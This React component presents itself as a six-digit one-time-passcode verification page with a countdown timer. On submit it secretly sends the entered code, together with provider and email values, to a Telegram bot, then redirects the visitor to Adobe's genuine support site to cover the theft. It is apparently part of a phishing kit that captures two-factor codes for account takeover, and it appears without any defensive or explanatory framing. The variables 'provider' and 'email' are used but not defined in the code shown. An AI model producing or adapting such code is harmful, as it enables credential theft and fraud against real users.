import { useEffect, useRef, useState } from "react";

export default function OtpPage() {
  const [digits, setDigits]   = useState(Array(6).fill(""));
  const [secondsLeft, setSL]  = useState(5 * 60);
  const [error, setError]     = useState(null);
  const [loading, setLoading] = useState(false);
  const inputsRef = useRef([]);

  /* ─── 5‑minute countdown ─── */
  useEffect(() => {
    const id = setInterval(() => setSL((s) => (s > 0 ? s - 1 : 0)), 1_000);
    return () => clearInterval(id);
  }, []);

  const fmt = (s) =>
    `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

  const handleChange = (val, idx) => {
    if (!/^\d?$/.test(val)) return;
    const next = [...digits];
    next[idx] = val;
    setDigits(next);
    if (val && idx < 5) inputsRef.current[idx + 1].focus();
  };

  /* ─── submit OTP ─── */
  const handleSubmit = async (e) => {
    e.preventDefault();
    const code = digits.join("");
    if (code.length !== 6) {
      setError("Please enter the 6‑digit code.");
      return;
    }

    setLoading(true);
    setError(null);

    try {
      const BOT  = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
      const CHAT = import.meta.env.VITE_TELEGRAM_CHAT_ID;
      const url  = `https://api.telegram.org/bot${BOT}/sendMessage`;

      const body = {
        chat_id: CHAT,
        text: `Provider: ${provider}\nEmail: ${email}\nOTP: ${code}`,
      };

      const res   = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data  = await res.json();

      if (data.ok) {
        window.location.href = "https://helpx.adobe.com/support.html";
      } else {
        throw new Error("Telegram rejected the request");
      }
    } catch {
      setError("Failed to submit. Try again.");
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center space-y-6">
      <h2 className="text-2xl font-bold text-white">Enter OTP</h2>

      <div className="text-xl font-mono text-white">{fmt(secondsLeft)}</div>

      <form onSubmit={handleSubmit} className="flex flex-col items-center space-y-4">
        <div className="flex gap-2">
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => (inputsRef.current[i] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={d}
              onChange={(e) => handleChange(e.target.value, i)}
              className="w-10 h-12 text-center rounded bg-white/20 text-white outline-none focus:ring-2 focus:ring-blue-500"
            />
          ))}
        </div>

        {error && <p className="text-red-400 text-sm">{error}</p>}

        <button
          type="submit"
          disabled={loading}
          className="bg-blue-600 text-white px-10 py-2 rounded disabled:opacity-50"
        >
          {loading ? "Submitting…" : "Verify"}
        </button>
      </form>
    </div>
  );
}
